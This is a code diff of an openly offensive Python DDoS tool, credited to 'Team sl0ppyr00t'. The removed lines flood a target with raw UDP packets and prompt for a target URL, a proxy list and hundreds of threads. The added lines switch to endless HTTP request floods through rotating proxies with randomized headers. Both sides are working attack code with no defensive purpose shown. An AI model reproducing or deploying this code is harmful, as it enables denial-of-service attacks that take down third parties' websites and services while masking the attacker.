@@ -8225,102 +8225,62 @@ ua = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.
 	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US",
 	"/4.0 ; MSIE 6.1; Windows XP",
 	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"	        			
-	]		]
+	]		
 			
 
 class Spammer(threading.Thread):
     def __init__(self, url, number, lista):
         threading.Thread.__init__(self)
-        self.url = f"{url}?{random.randint(0, 99999999)}={random.randint(0, 99999999)}"  # Keep URL simple
+        self.url = url + "?" + str(random.randint(0, 99999999)) + "=" + str(random.randint(0, 99999999))
         self.num = number
-        self.lista = lista
+        self.headers = {
+            'User-Agent': random.choice(ua),
+            'Keep-Alive': random.randint(110, 9960),
+            'Referer': random.choice(ref),
+            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+            'Accept-Encoding': 'gzip;q=0,deflate;q=0',
+            'Connection': 'Keep-Alive',
+            'Cache-Control': 'no-cache, no-store, must-revalidate',
+            'Cache-directive': 'no-cache',
+            'Pragma': 'no-cache',
+            'Upgrade-Insecure-Requests': '1',
+        }
         self.Lock = threading.Lock()
-        self.N = 0  # Local N for thread safety
+        self.lista = lista
 
     def request(self):
-        try:
-            # Raw socket setup for maximum throughput (using UDP for non-connection-based packets)
-            target_ip = self.url.split("//")[1].split("/")[0]  # Parse domain from URL
-            target_port = 80  # Standard HTTP port
+        global N
+        data = None
+        if N >= (len(self.lista) - 1):
+            N = 0
+        proxy = urllib.request.ProxyHandler({'http': self.lista[N]})
+        opener = urllib.request.build_opener(proxy)
+        urllib.request.install_opener(opener)
+        req = urllib.request.Request(self.url, data, self.headers)
+        urllib.request.urlopen(req)
 
-            # Create a raw UDP packet with a larger size (4096 bytes)
-            packet_size = 4096  # You can adjust this size based on your network capabilities
-            packet = random._urandom(packet_size)  # Random data packet of 4096 bytes
+        print(Fore.RED + "0000000000000000000000000000")
+        print(Fore.YELLOW + "DDoS Attack in Progress")
+        print(Fore.RED + "0000000000000000000000000000")
+        print(Style.RESET_ALL, end="")
 
-            # Send the UDP packet to the target IP and port
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.sendto(packet, (target_ip, target_port))
-
-            # Print out progress
-            print(Fore.RED + "0000000000000000000000000000")
-            print(Fore.YELLOW + "DDoS Attack in Progress")
-            print(Fore.RED + "0000000000000000000000000000")
-            print(Style.RESET_ALL, end="")
-
-            sys.stdout.write(Fore.WHITE + f"Thread #{self.num:4d} | Proxy {self.lista[self.N]} | Target {target_ip}:{target_port}")
-            sys.stdout.flush()
-            sys.stdout.write("\r")
-        except Exception as e:
-            print(Fore.RED + f"Error in thread #{self.num}: {str(e)}")
+        sys.stdout.write(Fore.WHITE + f"Thread #{self.num:4d} | {N:4d}/{len(self.lista)} | Proxy@{self.lista[N]}")
+        sys.stdout.flush()
+        sys.stdout.write("\r")
 
     def run(self):
+        global N
+        self.Lock.acquire()
+        print("Thread #%4d |" % self.num)
+        self.Lock.release()
+        time.sleep(1)
         while True:
             try:
-                with self.Lock:
-                    self.request()
-                    self.N = (self.N + 1) % len(self.lista)  # Rotate proxy efficiently
-                time.sleep(0.01)  # Very short delay between requests to maximize throughput
-            except Exception as e:
-                print(Fore.RED + f"Error in thread #{self.num}: {str(e)}")
-                break
-
+                N += 1
+                self.request()
+            except:
+                pass
+        sys.exit(0)
 
 class MainLoop():
     def __init__(self):
-        self.check_os_compatibility()
-
-    def check_os_compatibility(self):
-        if os.name in ("nt", "posix", "mac", "os2", "ce", "java", "riscos", "atheos", "amigaos", "beos", "uwin", "vms", "cygwin", "zos", "aix", "irix", "osf1", "hpux", "sunos", "freebsd", "openbsd", "netbsd", "darwin", "linux", "solaris", "haiku", "aros", "syllable", "skyos", "hurd", "minix", "android", "ios", "qnx", "blackberry", "webos", "windowsphone", "windowsce", "symbian", "microsoft", "dec", "sgi", "hp", "sun", "macintosh", "win32", "posix"):
-            self.title()
-
-    def title(self):
-        sys.stdout.write("\n" + " " * 90 + "+0000000000000000000000000000000000000000000000000000000+\n")
-        sys.stdout.write(" " * 90 + "0 Sophisticated DDoS Tool By Team sl0ppyr00t 0\n")
-        sys.stdout.write(" " * 90 + "0 Press Ctrl+C to stop the attack 0\n")
-        sys.stdout.write(" " * 90 + "+0000000000000000000000000000000000000000000000000000000+\n")
-
-    def setup(self):
-        global N
-        while True:
-            url = input('> Enter the target URL to DoS: ')
-            try:
-                # Parse out the domain and verify if the URL is valid
-                req = urllib.request.Request(url, None, {'User-Agent': random.choice(ua)})
-                urllib.request.urlopen(req)  # Test URL availability
-                break
-            except:
-                print('> Could not open the specified URL.')
-
-        while True:
-            try:
-                proxy_file = input('> Enter the path to the proxy list: ')
-                with open(proxy_file, 'r') as in_file:
-                    proxy_list = [i.strip() for i in in_file.readlines()]
-                break
-            except:
-                print('Error reading the proxy list file.')
-
-        while True:
-            try:
-                num_threads = int(input('> Enter the number of threads [600]: ') or '600')
-                break
-            except:
-                print('Invalid input. Please enter a number.')
-
-        # Create threads
-        for i in range(num_threads):
-            Spammer(url, i + 1, proxy_list).start()
-
-if __name__ == '__main__':
-    b = MainLoop()
-    b.setup()
